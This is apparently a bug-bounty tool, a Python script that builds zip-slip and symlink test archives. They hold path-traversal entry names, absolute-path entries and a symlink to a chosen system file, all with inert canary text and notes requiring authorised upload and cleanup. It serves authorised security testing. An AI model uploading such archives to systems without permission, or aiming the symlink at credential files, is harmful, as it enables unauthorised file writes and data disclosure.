#!/usr/bin/env python3
"""Build zip-slip and symlink test archives with inert canary content (offline).

Usage:
  zipslip_builder.py --out DIR [--depth 6] [--symlink-target /etc/hostname] [--name-prefix bbtest]

Creates in DIR:
  zipslip.zip / zipslip.tar      entries ../bbtest_zipslip_<id>_dN.txt for N=1..depth, a backslash variant,
                                 an absolute-path entry (/tmp/...), and a harmless in-directory README
  symlink.tar / symlink.zip      (only with --symlink-target) an entry that is a symlink to the target
  manifest.txt                   what each entry is and what to look for

Content of every file is a one-line inert text canary - never code. Upload these archives only
under execution class W (explicit permission) for zip slip; symlink archives read a benign file (class R).
"""
import argparse
import io
import os
import secrets
import stat
import sys
import tarfile
import time
import zipfile


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--out", required=True)
    ap.add_argument("--depth", type=int, default=6)
    ap.add_argument("--symlink-target")
    ap.add_argument("--name-prefix", default="bbtest")
    a = ap.parse_args()
    if not 1 <= a.depth <= 15:
        sys.exit("--depth must be 1..15")
    tid = secrets.token_hex(4)
    os.makedirs(a.out, exist_ok=True)
    canary = lambda name: f"{a.name_prefix} zip-slip canary id={tid} entry={name} - inert text, safe to delete\n".encode()

    entries = [f"{a.name_prefix}_README_{tid}.txt"]
    entries += ["../" * d + f"{a.name_prefix}_zipslip_{tid}_d{d}.txt" for d in range(1, a.depth + 1)]
    entries += ["..\\" * a.depth + f"{a.name_prefix}_zipslip_{tid}_bs.txt",
                f"/tmp/{a.name_prefix}_zipslip_{tid}_abs.txt",
                f"subdir/../../{a.name_prefix}_zipslip_{tid}_mixed.txt"]

    zpath = os.path.join(a.out, "zipslip.zip")
    with zipfile.ZipFile(zpath, "w", zipfile.ZIP_DEFLATED) as z:
        for n in entries:
            zi = zipfile.ZipInfo(n, date_time=time.localtime()[:6])
            zi.filename = n          # keep backslashes raw (ZipInfo converts os.sep on Windows)
            z.writestr(zi, canary(n))
    tpath = os.path.join(a.out, "zipslip.tar")
    with tarfile.open(tpath, "w") as t:
        for n in entries:
            data = canary(n)
            ti = tarfile.TarInfo(n)
            ti.size = len(data)
            ti.mtime = int(time.time())
            t.addfile(ti, io.BytesIO(data))

    lines = [f"test id: {tid}", "", "zipslip.zip / zipslip.tar entries:"] + [f"  {n}" for n in entries]
    lines += ["", "After an authorised upload, look for files named "
              f"'{a.name_prefix}_zipslip_{tid}_*' outside the extraction directory (served URL, listing, error).",
              "Delete them afterwards (or ask the program to) and record cleanup in the report."]

    if a.symlink_target:
        lname = f"{a.name_prefix}_link_{tid}.txt"
        sl_tar = os.path.join(a.out, "symlink.tar")
        with tarfile.open(sl_tar, "w") as t:
            ti = tarfile.TarInfo(lname)
            ti.type = tarfile.SYMTYPE
            ti.linkname = a.symlink_target
            ti.mtime = int(time.time())
            t.addfile(ti)
            data = canary("README")
            ri = tarfile.TarInfo(f"{a.name_prefix}_README_{tid}.txt")
            ri.size = len(data)
            t.addfile(ri, io.BytesIO(data))
        sl_zip = os.path.join(a.out, "symlink.zip")
        with zipfile.ZipFile(sl_zip, "w") as z:
            zi = zipfile.ZipInfo(lname, date_time=time.localtime()[:6])
            zi.create_system = 3                                   # Unix
            zi.external_attr = (stat.S_IFLNK | 0o777) << 16
            z.writestr(zi, a.symlink_target)
            z.writestr(f"{a.name_prefix}_README_{tid}.txt", canary("README"))
        lines += ["", f"symlink.tar / symlink.zip: '{lname}' -> {a.symlink_target}",
                  f"After upload/extraction, request '{lname}' through the app; target content = symlink followed."]

    with open(os.path.join(a.out, "manifest.txt"), "w", encoding="utf-8") as fh:
        fh.write("\n".join(lines) + "\n")
    print("\n".join(lines))
    print(f"\n[+] archives written to {a.out}")


if __name__ == "__main__":
    main()
